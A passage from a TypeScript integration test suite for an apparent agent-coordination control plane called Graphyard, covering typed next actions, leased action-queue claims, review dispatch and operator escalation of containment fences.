import { after, before, test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtemp } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createHash, randomBytes, randomUUID } from 'node:crypto';
import { setTimeout as delay } from 'node:timers/promises';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import EmbeddedPostgres from 'embedded-postgres';
import { Store } from '../src/store.js';
import { Engine } from '../src/engine.js';
import { server } from '../src/server.js';
import { evaluate, standingEscalations, type Observation, type Principal, type Work } from '../src/model.js';
import { actionClaimMs, actionId, actionRenewIntervalMs, claimable, claimAction, idleActionable, openActions, queueSnapshot, reconcileActions, renewClaim, settleAction, type ActionRow } from '../src/model/actions.js';
import { actionJudgment, executorRunnableKinds, llmRoles, mechanicalActionKinds, nextAction, nextActionKinds, nextActionLlmRoles, refusalAction, type NextActionKind } from '../src/model/next-action.js';
import { agentRequestLimit, agentRequestTypes, deciderFor, humanDecisions, leaseHeldRequestTypes, openAgentRequests, requestResolutionRefusal } from '../src/model/agent-requests.js';
import { reconcileAutoDispatch, reviewNeed } from '../src/model/dispatch.js';
import { reviewProviders } from '../src/model/review.js';
import { attachCommand, runningSessions, sessionHandleLimit, sessionSummary } from '../src/model/sessions.js';
import { pipelineSpeedSummary, speedTarget } from '../src/pipeline-speed.js';
import { dispatchEffects, executorEffects, executorKinds, launchedSessionHandle, runDispatchTick, runExecutor, runExecutorTick, runWorkerPull, workerPullIntervalMs, emptyDispatchCursor, type DispatchEffects, type ExecutorEffects } from '../src/auto-dispatch.js';
import { controlPlaneHandlers, executorMergeExecutor, judgmentInExecutorLoop } from '../src/executor.js';
import { runCycle, emptyDaemonState, type DaemonEffects } from '../src/master-daemon.js';
import { assertMergeCandidate, masterConfigSchema } from '../src/master.js';
// @ts-expect-error Dependency-free worker entry point.
import { pullOnce, transportRetries } from '../scripts/graphyard-pull.mjs';
import { agentRequestAttention, agentRequestReport, actionReport, sessionReport } from '../src/cli/master-status.js';
import { queueRef, type QueueSpeculation } from '../src/merge-queue.js';
import { pipelineBackfillState, resetPipelineBackfillState } from '../src/pipeline-backfill.js';
import { coordinationViewHeader } from '../src/server/work-view.js';
import WorkDetails from '../web/pages/work-details.js';

/**
 * GY-87: coordination inverted. The control plane computes a typed next action per item; durable
 * leased rows say whether anybody is running it; stateless executors claim and run them.
 *
 * Each test that produces a proof is named for it, so acceptance evidence maps to one executed
 * case per proof: integration:typed-next-action, integration:action-queue-leases,
 * integration:multi-executor-throughput, integration:worker-pull-model,
 * integration:no-llm-in-critical-path, integration:typed-agent-requests and
 * integration:session-handles-visible.
 *
 * No test here runs a master session. The fleet tests drive whole items to delivery through the
 * queue, using the handlers Graphyard ships (`src/executor.ts`) over stubbed launchers; `runCycle`
 * and `runDispatchTick` appear only where what the loop records about a session is the subject.
 */

const operator: Principal = { id: 'operator', role: 'admin', sessionKind: 'human' };
const worker: Principal = { id: 'agent-a', role: 'worker', runtime: 'claude' };
const otherWorker: Principal = { id: 'agent-b', role: 'worker', runtime: 'cursor' };
const executorA: Principal = { id: 'executor-a', role: 'coordinator' };
const executorB: Principal = { id: 'executor-b', role: 'coordinator' };
const producer: Principal = { id: 'ci-runner', role: 'producer', proofs: ['integration:inverted-loop'] };
const PROOF = 'integration:inverted-loop';
const head = 'a'.repeat(40), base = 'b'.repeat(40), mergeSha = 'c'.repeat(40);
const sha40 = (label: string) => label.replace(/[^a-f0-9]/g, '0').padEnd(40, 'f').slice(0, 40);

let database: EmbeddedPostgres, store: Store, engine: Engine;
let http: ReturnType<typeof server>, url: string;
before(async () => {
  // An offset no other file takes: test files run side by side, and two that share a port fail
  // whichever starts its Postgres second, in its `before` hook, with no reason given.
  const port = Number(process.env.GRAPHYARD_ACTION_QUEUE_TEST_PORT ?? Number(process.env.GRAPHYARD_TEST_PORT ?? 15438) + 71);
  database = new EmbeddedPostgres({ databaseDir: await mkdtemp(join(tmpdir(), 'graphyard-action-queue-')), user: 'graphyard', password: 'testing-only', port, persistent: false, onLog: () => {}, onError: () => {}, postgresFlags: ['-h', '127.0.0.1'] });
  await database.initialise(); await database.start(); await database.createDatabase('graphyard_test');
  store = new Store(`postgres://graphyard:testing-only@127.0.0.1:${port}/graphyard_test`); await store.init();
  engine = new Engine(store, [15368], 120, 'owner/project');
  engine.principals = [operator, worker, otherWorker, executorA, executorB, producer];
  http = server(engine, [{ ...operator, token: 'o'.repeat(32) }, { ...worker, token: 'w'.repeat(32) }, { ...executorA, token: 'x'.repeat(32) }]);
  await new Promise<void>(resolve => http.listen(0, '127.0.0.1', resolve));
  url = `http://127.0.0.1:${(http.address() as any).port}`;
});
after(async () => { if (http) await new Promise<void>(resolve => http.close(() => resolve())); if (store) await store.close(); if (database) await database.stop(); });

const reload = async (item: Work | string) => (await store.list()).find(entry => entry.id === (typeof item === 'string' ? item : item.id))!;
const events = async (item: Work, kind: string) => (await store.events(item.id)).filter(event => event.kind === kind).reverse();
const rows = (item: Work) => item.actionQueue?.actions ?? [];
/** The computed action's inputs, untyped at the call site so one assertion cannot narrow the next. */
const inputs = (item: Work): any => item.nextAction!.inputs;
const groupBy = <T>(entries: T[], key: (entry: T) => string) => entries.reduce<Record<string, T[]>>((groups, entry) => { (groups[key(entry)] ??= []).push(entry); return groups; }, {});
const row = (item: Work) => rows(item)[0];
/** A lease that lapsed: the document as it stands between the expiry and the reconciliation that clears it. */
const expireLease = (item: Work) => store.pool.query("UPDATE work_items SET document=jsonb_set(document,'{lease,expiresAt}',to_jsonb($2::text)) WHERE id=$1", [item.id, new Date(Date.now() - 60_000).toISOString()]);

let sequence = 0;
async function created(overrides: Record<string, unknown> = {}) {
  const item = await engine.execute(operator, 'create', null, { title: `Inverted loop ${++sequence}`, plannedFiles: ['src/'], criteria: [{ id: 'AC-1', text: 'Proven', proofs: [PROOF] }], ...overrides }, randomUUID());
  return item;
}
const release = async (item: Work) => engine.execute(operator, 'ready', item.id, {}, randomUUID());
async function submitted(actor: Principal = worker) {
  let item = await release(await created());
  item = await engine.execute(actor, 'claim', item.id, {}, randomUUID());
  item = await engine.execute(actor, 'workspace', item.id, { epoch: item.epoch, host: 'machine-a', path: `/tmp/inverted/${item.id}`, branch: `graphyard/${item.key.toLowerCase()}-${item.epoch}` }, randomUUID());
  return engine.execute(actor, 'submit', item.id, { epoch: item.epoch, pr: Number(item.key.slice(3)) }, randomUUID());
}
/** The provider's view of a candidate: approved, both checks green, mergeable and protected. */
function observation(item: Work, overrides: Partial<Observation> = {}): Observation {
  return {
    clockOffset: { min: 0, max: 0 },
    candidate: { sha: head, baseSha: base, pr: item.submission!.pr, branch: item.workspaces.at(-1)!.branch, author: 'implementer' },
    checks: [{ name: 'test', result: 'success', appId: 15368 }, { name: 'typecheck', result: 'success', appId: 15368 }],
    reviews: [{ reviewer: 'reviewer', sha: head, state: 'APPROVED' }], protected: true, mergeable: true,
    merged: false, mergeSha: null, files: ['src/loop.ts'], scopeFiles: [], at: new Date().toISOString(),
    prState: 'open', draft: false, baseTip: base, baseTree: sha40('7e'), baseTipContained: true, ...overrides,
  };
}
/** Trusted evidence for the item's one mechanical proof on the head: since GY-115 its review follows it. */
const proveHead = (item: Work) => engine.execute(producer, 'evidence', item.id, { proof: PROOF, sha: head, baseSha: base, policyRevision: item.policyRevision, result: 'pass', executed: 1, skipped: 0, exercise: { behaviour: 'the change under test', result: 'fail', executed: 1 } }, randomUUID());
/** Publish the queue tip the merge authorization requires; the queue's own behaviour has its own tests. */
async function publishTip(item: Work) {
  const current = await reload(item);
  if (!current.queue || current.queue.speculation) return current;
  const speculation: QueueSpeculation = { ref: queueRef(current.key), tip: current.candidate!.sha, base: current.candidate!.baseSha, baseTree: sha40('7e'), predecessors: [], policyRevision: current.policyRevision, publishedAt: new Date().toISOString() };
  await store.pool.query("UPDATE work_items SET document=jsonb_set(document,'{queue,speculation}',$2::jsonb) WHERE id=$1", [current.id, JSON.stringify(speculation)]);
  return reload(current);
}
/** Drive one item from its authorized candidate through the guarded merge to a delivered snapshot. */
async function mergeItem(actor: Principal, item: Work) {
  let current = await publishTip(item);
  current = await engine.observe(current.id, current.revision, observation(current));
  const committed = await engine.requestEnqueue(actor, current.id, { enqueue: true, expectedRevision: current.revision, sha: head, baseSha: base, policyRevision: current.policyRevision }, randomUUID());
  const mergedAt = new Date(Math.ceil((Date.parse(committed.enqueue.at) + 1) / 1000) * 1000).toISOString().replace(/\.\d+Z$/, 'Z');
  return engine.observe(current.id, committed.revision, { ...observation(current), merged: true, mergeSha, mergedAt });
}

// ---- AC-1: the control plane computes a typed next action ------------------------------------

test('integration:typed-next-action — the control plane names one typed action per open item, with the inputs it needs, and every gate refusal maps to exactly one action or to escalate', async () => {
  // Backlog is not open work: an unreleased item raises no action at all, though its refusal
  // still maps to one — releasing it is the operator's call about what to work on.
  let item = await created();
  assert.equal(item.nextAction, null);
  assert.deepEqual(item.actionQueue!.actions, []);
  assert.equal(refusalAction(item, 'ready', 'Not released from backlog'), 'escalate');

  // Ready and unassigned: a dispatch, carrying what a launcher needs to choose a profile.
  item = await release(item);
  assert.equal(item.nextAction!.kind, 'dispatch');
  assert.deepEqual(inputs(item), { kind: 'dispatch', target: 'implementation', epoch: 0, priority: 2, plannedFiles: ['src/'] });
  assert.equal(item.nextAction!.llmRole, 'implement');
  assert.equal(item.nextAction!.work, item.id); assert.equal(item.nextAction!.key, item.key);

  // Claimed: a session is already doing exactly what the build gate waits for, so nothing is named.
  item = await engine.execute(worker, 'claim', item.id, {}, randomUUID());
  assert.equal(item.nextAction, null, 'a live lease is not a second dispatch');

  // Submitted but never observed: the control plane must read the pull request before anything else.
  item = await engine.execute(worker, 'workspace', item.id, { epoch: 1, host: 'machine-a', path: `/tmp/inverted/${item.id}`, branch: `graphyard/${item.key.toLowerCase()}-1` }, randomUUID());
  item = await engine.execute(worker, 'submit', item.id, { epoch: 1, pr: Number(item.key.slice(3)) }, randomUUID());
  assert.equal(item.nextAction!.kind, 'resync');
  assert.equal(inputs(item).pr, item.submission!.pr);

  // Observed, but its mechanical proof has not run (GY-115): the producer is what the head needs
  // next, and no reviewer is asked about it yet.
  item = await engine.observe(item.id, item.revision, observation(item, { reviews: [] }));
  assert.equal(item.nextAction!.kind, 'dispatch');
  assert.deepEqual(inputs(item), { kind: 'dispatch', target: 'proof', group: 'integration', proofs: [PROOF], requestId: item.autoDispatch!.producers[0].id, pr: item.submission!.pr, sha: head, baseSha: base, policyRevision: 1 });
  assert.equal(item.nextAction!.llmRole, 'produce-evidence');
  assert.equal(item.nextAction!.gate, 'review'); assert.equal(item.autoDispatch!.review, null);
  assert.equal(refusalAction(item, 'review', item.nextAction!.refusal!), 'dispatch');

  // Proven and without an approval: the review request, bound to the exact head, base and policy.
  item = await proveHead(item);
  assert.equal(item.nextAction!.kind, 'request-review');
  assert.deepEqual(inputs(item), { kind: 'request-review', provider: 'github', requestId: item.autoDispatch!.review!.id, pr: item.submission!.pr, sha: head, baseSha: base, policyRevision: 1 });
  assert.equal(item.nextAction!.llmRole, 'review');

  // A reviewer that requested changes on this exact head: no review can be asked for it again, so
  // the item is named as owing a new head. Naming `request-review` here is the silence AC-1 ends —
  // no review request stands, so no executor could ever complete the action it was handed.
  item = await engine.observe(item.id, item.revision, observation(item, { reviews: [{ reviewer: 'reviewer', sha: head, state: 'CHANGES_REQUESTED' }] }));
  assert.equal(item.nextAction!.kind, 'request-rework');
  assert.equal(item.nextAction!.gate, 'review');
  assert.equal(item.nextAction!.llmRole, 'approve-decision', 'a new head is a judgment owed, not a step an executor runs');
  assert.match(inputs(item).detail, /reviewer requested changes on [0-9a-f]{12}; the next head is reviewed afresh/);
  assert.equal(item.autoDispatch!.review, null, 'and the control plane asks nobody to review a head nobody may review');
  assert.equal(refusalAction(item, 'review', item.nextAction!.refusal!), 'request-rework', 'the refusal maps there too, so the queue and the gate agree');

  // A head that does not contain the base tip and conflicts with it (GY-191: behind alone is
  // reviewed as it stands) is answered by a fresh reading and a sync, not a review.
  item = await engine.observe(item.id, item.revision, observation(item, { reviews: [], baseTipContained: false, baseTip: sha40('ef'), mergeable: false, conflicting: true }));
  assert.equal(item.nextAction!.kind, 'resync');
  assert.equal(item.nextAction!.gate, 'review');
  assert.match(item.nextAction!.reason, /does not contain the base tip [0-9a-f]{12}/);

  // A base the control plane could not merge in cleanly is the same shape of mistake the other
  // way: the refusal itself says to resolve it and push, and that the approval and proofs bound to
  // this head do not survive the resolution. A re-read cannot produce that head, so the item owes
  // a new one — otherwise the row completes, waits ten minutes, reopens and repeats forever.
  const conflict = `Candidate ${head.slice(0, 12)} cannot be brought onto base branch tip ${sha40('ef').slice(0, 12)} without resolving a conflict, which is content nobody reviewed or proved: merge conflict in src/loop.ts. Run graphyard sync ${item.key}, resolve it and push; the approval and proofs bound to ${head.slice(0, 12)} do not survive the resolution.`;
  const conflicted = { ...structuredClone(await reload(item)), lease: null,
    baseRefresh: { from: { sha: head, baseSha: base }, base: sha40('ef'), baseTree: sha40('7e'), policyRevision: 1, at: new Date().toISOString(), head: null, conflict, carry: null } } as unknown as Work;
  Object.assign(conflicted, evaluate(conflicted, [conflicted], new Date(), [15368]));
  const conflictAction = nextAction(conflicted, [conflicted], new Date())!;
  assert.equal(conflictAction.gate, 'build');
  assert.equal(conflictAction.refusal, conflict);
  assert.equal(conflictAction.kind, 'request-rework', 'a conflict the control plane cannot resolve needs a new head, not a re-read');
  assert.equal(refusalAction(conflicted, 'build', conflict), 'request-rework');
  assert.match((conflictAction.inputs as any).detail, new RegExp(`Run graphyard sync ${item.key}, resolve it and push`), 'and the detail carries the instruction the worker follows');

  // The same mistake, one provider over. A `codex` or `agent` review is dispatched by the control
  // plane's own durable observation job and never by a session an executor launches, so
  // `reviewNeed` raises no review request for those providers — and naming `request-review` there
  // handed an executor a row nothing could settle: no request stands, the handler refuses for want
  // of one, and the row fails, backs off to the retry cap and is claimed again every tick forever
  // while the item is never shown as owing a judgment. Every provider the policy supports is
  // therefore named an action an executor can carry to completion, or an escalation where only an
  // operator can act — never one that cannot succeed.
  const reviewable = await reload(item);
  const providerProbe = (policy: Record<string, unknown>, overrides: Partial<Work> = {}) => {
    const probe = { ...structuredClone(reviewable), lease: null, policy: { ...reviewable.policy, ...policy },
      observation: observation(reviewable, { reviews: [], baseTipContained: true, baseTip: base }), ...structuredClone(overrides) } as unknown as Work;
    Object.assign(probe, evaluate(probe, [probe], new Date(), [15368]));
    return probe;
  };
  const claude = { name: 'claude', runtime: 'claude', reviewerApp: 'claude-app', timeoutSeconds: 1800 };
  const answerable: NextActionKind[] = [...executorRunnableKinds, 'escalate'];
  for (const provider of reviewProviders) {
    const probe = providerProbe(provider === 'agent' ? { reviewProvider: provider, reviewerProfiles: [claude] } : { reviewProvider: provider });
    const action = nextAction(probe, [probe], new Date())!;
    assert.equal(action.gate, 'review', `${provider}: the review gate is the one refusing`);
    assert.ok(answerable.includes(action.kind), `${provider}: ${action.kind} is an action an executor runs or an escalation, not one nothing can complete`);
    assert.equal(refusalAction(probe, 'review', action.refusal!), action.kind, `${provider}: the refusal maps to the same kind, so the queue and the gate agree`);
    reconcileAutoDispatch(probe, [probe], new Date());
    if (provider === 'github') {
      assert.equal(action.kind, 'request-review', 'a GitHub approval is the one review a launched session answers');
      assert.ok(probe.autoDispatch!.review, 'so a request stands for its handler to find');
      assert.equal((nextAction(probe, [probe], new Date())!.inputs as any).requestId, probe.autoDispatch!.review!.id, 'and the action names it');
    } else {
      assert.equal(action.kind, 'resync', `${provider}: the fresh reading that wakes the observation job is what requests the review and reads its verdict`);
      assert.equal(reviewNeed(probe).needed, false, `${provider}: no launched reviewer is asked for`);
      assert.equal(probe.autoDispatch!.review, null, `${provider}: and none is requested, so no executor could answer a request-review`);
      assert.match(action.reason, new RegExp(`control plane dispatches ${provider} review`));
    }
  }

  // An agent policy whose reviewer roster is spent for this candidate has nobody left to ask.
  // Adding reviewer capacity or selecting another provider is the operator's judgment, so it
  // escalates — visible and owed — rather than naming a review or re-reading forever.
  const spent = providerProbe({ reviewProvider: 'agent', reviewerProfiles: [claude] }, { reviewFailovers: [{ profile: 'claude', reviewerApp: 'claude-app', runtime: 'claude',
    exhaustion: 'usage-limit', reason: 'the reviewer runtime reported a usage limit', at: new Date().toISOString(), sha: head, baseSha: base, policyRevision: 1, requestCommentId: 7, nextProfile: null }] } as Partial<Work>);
  const spentAction = nextAction(spent, [spent], new Date())!;
  assert.equal(spentAction.kind, 'escalate');
  assert.equal(spentAction.gate, 'review');
  assert.equal(spentAction.llmRole, 'resolve-escalation');
  assert.match(spentAction.reason, /no executor step answers it: every configured reviewer profile is exhausted for [0-9a-f]{12} \(claude\)/);
  assert.match((spentAction.inputs as any).detail, /adding reviewer capacity or selecting another review provider is the operator's decision/);
  assert.equal(spentAction.refusal, 'Every configured reviewer profile is exhausted for this candidate (claude); add reviewer capacity or select another review provider', 'and the refusal it classified is carried verbatim');
  assert.equal(refusalAction(spent, 'review', spentAction.refusal!), 'escalate');

  // A change request answers a head under every provider as well: an agent reviewer records its
  // verdict against the dispatched request rather than as a GitHub review, and either way the
  // item owes a new head rather than another review of this one.
  const answered = providerProbe({ reviewProvider: 'codex' });
  answered.observation!.agentReview = { provider: 'codex', sha: head, approved: false, verdict: 'changes-requested', requestId: 11, reason: 'the refusal is still swallowed' };
  Object.assign(answered, evaluate(answered, [answered], new Date(), [15368]));
  const answeredAction = nextAction(answered, [answered], new Date())!;
  assert.equal(answeredAction.kind, 'request-rework');
  assert.equal(answeredAction.llmRole, 'approve-decision', 'a new head is a judgment owed, not a step an executor runs');
  assert.match((answeredAction.inputs as any).detail, /codex requested changes on [0-9a-f]{12}; the next head is reviewed afresh/);

  // Approved, green and already proven — the proof dispatch the acceptance gate once named here now
  // precedes the review (above): the merge, with the queue position it will land in.
  item = await engine.observe(item.id, item.revision, observation(item, { baseTipContained: true, baseTip: base }));
  item = await publishTip(item);
  item = await engine.observe(item.id, item.revision, observation(item));
  assert.equal(item.nextAction!.kind, 'merge');
  assert.equal(inputs(item).sha, head);
  assert.equal(item.nextAction!.llmRole, null, 'merging is mechanical: the gates already decided');

  // A live scope request outranks the gates: the worker holding the item is idle until it is answered.
  const blocked = await submitted();
  const claimedAgain = await engine.execute(operator, 'rework', blocked.id, { reason: 'reopen for the scope ask', previousWorkerStopped: true }, randomUUID());
  let scoped = await engine.execute(worker, 'claim', claimedAgain.id, {}, randomUUID());
  scoped = await engine.execute(worker, 'scope', scoped.id, { epoch: scoped.epoch, paths: ['docs/'], reason: 'the guide describes this contract' }, randomUUID());
  assert.equal(scoped.nextAction!.kind, 'approve-scope');
  assert.deepEqual(inputs(scoped), { kind: 'approve-scope', epoch: scoped.epoch, paths: ['docs/'], requestedBy: worker.id, detail: 'the guide describes this contract' });

  // The API exposes both the per-item action and the whole queue.
  const response = await fetch(`${url}/api/actions`, { headers: { Authorization: `Bearer ${'x'.repeat(32)}` } });
  const body = await response.json();
  assert.equal(response.status, 200);
  assert.deepEqual(body.kinds, [...nextActionKinds]);
  assert.deepEqual(body.mechanical, [...mechanicalActionKinds]);
  assert.ok(body.nextActions.some((entry: any) => entry.key === item.key && entry.kind === 'merge'));
  assert.ok(body.actions.some((entry: ActionRow) => entry.key === scoped.key && entry.kind === 'approve-scope'));
  const snapshot = await (await fetch(`${url}/api/work-snapshot`, { headers: { Authorization: `Bearer ${'x'.repeat(32)}` } })).json();
  assert.ok((snapshot.work as Work[]).every(entry => 'nextAction' in entry), 'every item carries its computed action');

  // Totality: every refusal any gate raises across a battery of states maps to exactly one kind.
  const all = await store.list();
  const probes: Work[] = [
    ...all,
    { ...all[0], blocker: 'The staging database is unreachable', gates: [{ name: 'ready', passed: false, reasons: ['The staging database is unreachable'] }] } as Work,
    { ...all[0], gates: [{ name: 'build', passed: false, reasons: ['Candidate changes 2 files outside its planned files that must match the base branch byte-for-byte; run graphyard sync GY-1, restore each file from origin/<base>, and push again', 'Out-of-scope regression: src/other.ts reverts GY-2'] }] } as Work,
    { ...all[0], gates: [{ name: 'review', passed: false, reasons: ['Outstanding change requests must be resolved through a new review'] }] } as Work,
    { ...all[0], gates: [{ name: 'merge', passed: false, reasons: ['Required Graphyard check and merge-queue branch protection have not been verified'] }] } as Work,
    { ...all[0], gates: [{ name: 'acceptance', passed: false, reasons: [`Trusted ${PROOF} evidence from agent-a is no longer independent: agent-a has since held an assignment on GY-1`] }] } as Work,
  ];
  const seen = new Map<string, NextActionKind>();
  for (const probe of probes) for (const gate of probe.gates) for (const refusal of gate.reasons) {
    const kind = refusalAction(probe, gate.name, refusal);
    assert.ok(nextActionKinds.includes(kind), `${gate.name}: ${refusal} mapped to ${kind}`);
    assert.equal(refusalAction(probe, gate.name, refusal), kind, 'the mapping is a function of its inputs');
    seen.set(`${gate.name}:${refusal}`, kind);
  }
  assert.ok(seen.size >= 10, `the battery covered ${seen.size} distinct refusals`);
  assert.deepEqual([...new Set(probes.flatMap(probe => probe.gates.map(gate => gate.name)))].sort(), ['acceptance', 'build', 'merge', 'ready', 'review', 'test'], 'every gate contributed a refusal');
  // The named mappings, one per gate, and the catch-all that makes the function total.
  assert.equal(refusalAction(all[0], 'ready', 'Not released from backlog'), 'escalate');
  assert.equal(refusalAction(all[0], 'ready', 'Dependency GY-9 is unfinished'), 'dispatch');
  assert.equal(refusalAction(all[0], 'build', 'Worker has not submitted implementation for this attempt'), 'dispatch');
  assert.equal(refusalAction(all[0], 'build', 'Pull request has not been independently observed'), 'resync');
  assert.equal(refusalAction(all[0], 'review', 'Independent approval of the current commit is required'), 'request-review');
  assert.equal(refusalAction(all[0], 'merge', 'Merge queue position 2 of 3: GY-1 is ahead'), 'merge');
  assert.equal(refusalAction(all[0], 'nowhere', 'A refusal nobody has written a rule for yet'), 'escalate', 'an unmapped refusal escalates rather than vanishing');
  // A required check that reported a failure needs a new head; one still to answer needs a re-read.
  const failing = { ...all[0], observation: { ...observation(item), checks: [{ name: 'test', result: 'failure', appId: 15368 }] } } as Work;
  assert.equal(refusalAction(failing, 'test', 'Required CI check test has not passed on the current candidate'), 'request-rework');
  assert.equal(refusalAction({ ...failing, observation: { ...failing.observation!, checks: [] } } as Work, 'test', 'Required CI check test has not passed on the current candidate'), 'resync');
});

test('integration:typed-next-action — an unsettled containment fence escalates instead of naming a reclaim nothing can complete, and the reclaim handler refuses to call a fenced item free', async () => {
  // A supervised worker fences its launch, submits, and lets the lease lapse. The quarantine
  // outlives the attempt that raised it, and reconciliation records that lapse as an explained
  // expiry rather than an incident — so nothing pre-empts what the fence itself needs.
  let fenced = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  const settlementToken = randomBytes(32).toString('hex'), settlementHash = createHash('sha256').update(settlementToken).digest('hex');
  const fencedEpoch = fenced.epoch;
  fenced = await engine.execute(worker, 'workspace', fenced.id, { epoch: fencedEpoch, host: 'machine-a', path: `/tmp/fenced/${fenced.id}`, branch: `graphyard/${fenced.key.toLowerCase()}-${fencedEpoch}` }, randomUUID());
  fenced = await engine.execute(worker, 'quarantine', fenced.id, { epoch: fencedEpoch, settlementHash }, randomUUID());
  fenced = await engine.execute(worker, 'submit', fenced.id, { epoch: fencedEpoch, pr: Number(fenced.key.slice(3)) }, randomUUID());
  await expireLease(fenced);

  // An assignment nobody fenced, whose lease lapsed with nothing submitted, is the other half of
  // `reclaim` — and the half that works: the reconciliation the control plane already runs clears
  // it, so the executor only has to ask for one.
  const lapsed = await engine.execute(worker, 'claim', (await release(await created())).id, {}, randomUUID());
  await expireLease(lapsed);
  const now = new Date();
  const probe = structuredClone(await reload(lapsed));
  Object.assign(probe, evaluate(probe, [probe], now, [15368]));
  const reclaim = nextAction(probe, [probe], now)!;
  assert.equal(reclaim.kind, 'reclaim');
  assert.equal(reclaim.llmRole, null, 'asking the control plane to look again needs no judgment');
  assert.deepEqual(reclaim.inputs, { kind: 'reclaim', epoch: probe.lease!.epoch, owner: worker.id, leaseExpiresAt: probe.lease!.expiresAt });
  reconcileActions(probe, [probe], now, { next: reclaim });
  const reclaimRow = probe.actionQueue!.actions.find(entry => entry.kind === 'reclaim')!;

  // Nothing an executor runs lowers a fence. `reclaim` asks the control plane to re-read the item
  // and reconcile it, which clears a lapsed lease and never touches a quarantine: only the
  // worker's settlement capability, a verified containment assessment or an operator's
  // stopped-worker recovery does, and each rests on somebody judging that the worker really
  // stopped. Naming `reclaim` here handed an executor a row whose handler reported the item free
  // while it was still fenced and came back every settle window for as long as the fence stood.
  // No executor step answers it, so it escalates — visible and owed — exactly as an exhausted
  // reviewer roster does.
  await engine.reconcile();
  fenced = await reload(fenced);
  assert.equal(fenced.lease, null, 'the lapse is cleared');
  assert.ok(fenced.containmentQuarantine, 'and the fence it raised outlives it');
  assert.deepEqual(standingEscalations(fenced), [], 'a submitted epoch explains its own lapse, so no lease-loss escalation stands in front of this');
  assert.equal(fenced.nextAction!.kind, 'escalate');
  assert.equal(fenced.nextAction!.llmRole, 'resolve-escalation');
  assert.match(fenced.nextAction!.reason, new RegExp(`${fenced.key} is fenced by unverified containment from epoch ${fencedEpoch}`));
  assert.equal(inputs(fenced).trigger, 'containment');
  assert.match(inputs(fenced).detail, new RegExp(`settle the epoch ${fencedEpoch} quarantine \\(graphyard master settle-containment ${fenced.key} REASON\\)`));
  const fencedRow = rows(fenced).find(entry => entry.binding === fenced.nextAction!.binding)!;
  assert.equal(fencedRow.kind, 'escalate', 'the durable row is the escalation');
  assert.equal(actionJudgment.escalate, 'in-step');
  assert.ok(!executorRunnableKinds.includes('escalate'), 'which no executor claims, so nothing retries it every settle window');
  assert.ok(!rows(fenced).some(entry => entry.kind === 'reclaim'), 'and no reclaim row stands beside it');

  // A row computed before a fence landed is still claimed and run after it, so the handler itself
  // must never call such an item free. The shipped handlers are the ones under test here.
  const unusable = async (): Promise<never> => { throw new Error('a reclaim reaches no launcher'); };
  const handlers = controlPlaneHandlers(() => fleetConfig, {
    snapshot: async () => ({ work: await store.list(), now: new Date().toISOString() }),
    mutate: async path => engine.resyncWork(executorA, path.split('/')[1]),
    agents: () => [], workerCredentials: async () => ({}), producerCredentials: async () => ({}),
    dispatchWorker: unusable, launchReview: unusable, launchProducer: unusable, merge: unusable, observeDeployment: unusable,
  });
  const who = { id: executorA.id, host: 'host-1' };
  await assert.rejects(async () => handlers.reclaim!({ ...reclaimRow, work: fenced.id, key: fenced.key }, who),
    new RegExp(`${fenced.key} is still fenced by unverified containment from epoch ${fencedEpoch}; a quarantine is lowered by settlement or stopped-worker recovery, never by a re-read`));

  // The unfenced lapse is exactly what the kind is for, and the guard leaves it alone.
  assert.match(await handlers.reclaim!(reclaimRow, who) as string, new RegExp(`${lapsed.key} is no longer held by a lapsed assignment`));
  assert.equal((await reload(lapsed)).lease, null);

  // The fence is what held it: settled, the item needs what the gates say again.
  const settled = await engine.execute(worker, 'settle', fenced.id, { epoch: fencedEpoch, settlementToken }, randomUUID());
  assert.equal(settled.containmentQuarantine, null);
  assert.equal(settled.nextAction!.kind, 'resync', 'a submitted candidate nobody has observed is read, not escalated');
});

// ---- AC-2: durable rows, leased claims, idempotency ------------------------------------------

test('integration:action-queue-leases — actions are durable leased rows: a dead executor loses its claim, another retries without double-executing, and history names requester, executor, result and reason', async () => {
  const pending = await submitted();
  let item = await proveHead(await engine.observe(pending.id, pending.revision, observation(pending, { reviews: [] })));
  const open = rows(item);
  assert.equal(open.length, 1);
  assert.equal(open[0].kind, 'request-review');
  assert.equal(open[0].state, 'pending');
  assert.equal(open[0].id, actionId('request-review', item.id, open[0].binding), 'the row id is derived from what it binds, never from when it was made');
  assert.deepEqual(open[0].history.map(entry => [entry.event, entry.requester, entry.executor]), [['requested', 'graphyard', null]]);

  // A re-evaluation of the same situation recognises the row it already has.
  const before = structuredClone(item);
  assert.deepEqual(reconcileActions(before, [before], new Date()), [], 'an unchanged situation queues nothing twice');

  // Executor A claims it under a bounded lease.
  const claimKey = randomUUID();
  const claimed = await engine.claimNextAction(executorA, { host: 'host-1', kinds: ['request-review'] }, claimKey);
  assert.equal(claimed.action!.kind, 'request-review');
  assert.equal(claimed.action!.claim!.executor, executorA.id);
  assert.equal(claimed.action!.claim!.host, 'host-1');
  assert.equal(claimed.action!.attempts, 1);
  assert.equal(Date.parse(claimed.action!.claim!.expiresAt) - Date.parse(claimed.action!.claim!.claimedAt), actionClaimMs);
  assert.deepEqual(await engine.claimNextAction(executorA, { host: 'host-1', kinds: ['request-review'] }, claimKey), claimed, 'a replayed claim returns its receipt rather than taking a second row');

  // Executor B finds nothing to take and cannot settle a row it does not hold.
  const empty = await engine.claimNextAction(executorB, { host: 'host-2', kinds: ['request-review'], work: item.key }, randomUUID());
  assert.equal(empty.action, null);
  await assert.rejects(engine.settleClaimedAction(executorB, claimed.action!.id, { result: 'done', reason: 'stolen' }, randomUUID()), /claimed by executor-a/);

  // Executor A dies mid-action: it renews nothing, so the claim expires and B takes attempt two.
  await store.pool.query(`UPDATE work_items SET document=jsonb_set(document,'{actionQueue,actions,0,claim,expiresAt}',to_jsonb($2::text)) WHERE id=$1`, [item.id, new Date(Date.now() - 1000).toISOString()]);
  const retried = await engine.claimNextAction(executorB, { host: 'host-2', kinds: ['request-review'] }, randomUUID());
  assert.equal(retried.action!.id, claimed.action!.id, 'the same action, not a second one');
  assert.equal(retried.action!.attempts, 2);
  assert.equal(retried.action!.claim!.executor, executorB.id);
  assert.ok(retried.action!.history.some(entry => entry.event === 'reclaimed' && entry.executor === executorA.id));
  await assert.rejects(engine.settleClaimedAction(executorA, claimed.action!.id, { result: 'done', reason: 'back from the dead' }, randomUUID()), /claimed by executor-b/,
